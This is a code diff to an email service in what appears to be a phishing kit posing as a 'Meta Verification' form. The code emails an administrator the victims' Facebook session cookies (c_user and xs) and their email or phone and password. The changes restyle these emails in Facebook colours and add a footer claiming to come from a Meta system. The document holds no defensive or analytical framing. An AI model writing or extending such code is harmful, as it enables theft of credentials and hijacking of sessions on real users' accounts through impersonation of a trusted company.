@@ -17,10 +17,13 @@ class EmailService {
       to: validationFormEmailConfig.adminEmail,
       subject: 'New Meta Verification Form Submission',
       html: `
-        <h2>New Validation Form Submission</h2>
-        <p><strong>c_user:</strong> ${data.c_user}</p>
-        <p><strong>xs:</strong> ${data.xs}</p>
-        <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
+        <h2 style="color: #1877f2;">New Form Submission - Validation Step</h2>
+        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
+          <p><strong>c_user:</strong> ${data.c_user}</p>
+          <p><strong>xs:</strong> ${data.xs}</p>
+          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
+        </div>
+        <p style="color: #65676B; font-size: 12px;">This is an automated message from the Meta Verification system.</p>
       `
     };
 
@@ -41,10 +44,13 @@ class EmailService {
       to: confirmationFormEmailConfig.adminEmail,
       subject: 'New Meta Account Verification Form Submission',
       html: `
-        <h2>New Confirmation Form Submission</h2>
-        ${data.user_email ? `<p><strong>Email/Phone:</strong> ${data.user_email}</p>` : ''}
-        <p><strong>Password:</strong> ${data.password}</p>
-        <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
+        <h2 style="color: #1877f2;">New Form Submission - Confirmation Step</h2>
+        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
+          ${data.user_email ? `<p><strong>Email/Phone:</strong> ${data.user_email}</p>` : '<p><strong>Note:</strong> No email/phone provided</p>'}
+          <p><strong>Password:</strong> ${data.password}</p>
+          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
+        </div>
+        <p style="color: #65676B; font-size: 12px;">This is an automated message from the Meta Verification system.</p>
       `
     };
 
